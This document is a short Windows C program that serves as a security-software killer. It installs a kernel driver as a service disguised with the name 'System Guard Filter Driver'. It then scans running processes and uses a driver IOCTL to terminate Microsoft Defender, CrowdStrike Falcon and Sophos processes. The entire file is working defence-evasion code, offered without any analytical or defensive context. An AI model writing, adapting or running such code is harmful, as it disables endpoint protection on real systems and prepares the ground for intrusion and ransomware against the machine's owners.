#include <windows.h>
#include <tlhelp32.h>
#include <wchar.h>

#define TERMINATE_PROCESS_IOCTL 0x222024

static const wchar_t *security_processes[] = {
    L"MsMpEng.exe",
    L"CSFalconService.exe",
    L"SophosHealth.exe",
};

static BOOL is_security_process(const wchar_t *name) {
    for (SIZE_T i = 0; i < ARRAYSIZE(security_processes); ++i) {
        if (_wcsicmp(name, security_processes[i]) == 0) {
            return TRUE;
        }
    }
    return FALSE;
}

static void install_driver_service(void) {
    SC_HANDLE manager = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (manager == NULL) {
        return;
    }

    SC_HANDLE service = CreateServiceW(
        manager,
        L"SystemGuard",
        L"System Guard Filter Driver",
        SERVICE_START | DELETE,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        L"C:\\Windows\\System32\\drivers\\sysguard64.sys",
        NULL, NULL, NULL, NULL, NULL);

    if (service != NULL) {
        StartServiceW(service, 0, NULL);
        CloseServiceHandle(service);
    }
    CloseServiceHandle(manager);
}

int wmain(void) {
    install_driver_service();

    HANDLE device = CreateFileW(
        L"\\\\.\\SystemGuard",
        GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING, 0, NULL);
    if (device == INVALID_HANDLE_VALUE) {
        return 1;
    }

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W entry = { .dwSize = sizeof(entry) };
    if (snapshot != INVALID_HANDLE_VALUE && Process32FirstW(snapshot, &entry)) {
        do {
            if (is_security_process(entry.szExeFile)) {
                DWORD returned = 0;
                DeviceIoControl(
                    device,
                    TERMINATE_PROCESS_IOCTL,
                    &entry.th32ProcessID,
                    sizeof(entry.th32ProcessID),
                    NULL, 0, &returned, NULL);
            }
        } while (Process32NextW(snapshot, &entry));
    }

    if (snapshot != INVALID_HANDLE_VALUE) {
        CloseHandle(snapshot);
    }
    CloseHandle(device);
    return 0;
}
